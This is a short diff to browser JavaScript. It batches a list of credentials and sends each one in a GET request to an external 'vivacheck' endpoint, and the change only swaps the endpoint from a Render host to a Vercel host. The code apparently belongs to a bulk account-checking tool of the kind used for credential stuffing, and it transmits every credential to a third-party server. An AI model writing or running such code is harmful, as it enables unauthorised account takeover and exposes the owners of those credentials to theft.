@@ -27,7 +27,7 @@ document.addEventListener('DOMContentLoaded', function () {
                 const endIndex = Math.min(startIndex + batchSize, credentials.length);
                 const batchCredentials = credentials.slice(startIndex, endIndex);
 
-                const requests = batchCredentials.map(cred => axios.get(`https://viva-216j.onrender.com/vivacheck?creds=${encodeURIComponent(cred)}`));
+                const requests = batchCredentials.map(cred => axios.get(`https://viva-api.vercel.app/vivacheck?creds=${encodeURIComponent(cred)}`));
                 const responses = await Promise.all(requests);
 
                 responses.forEach(response => {
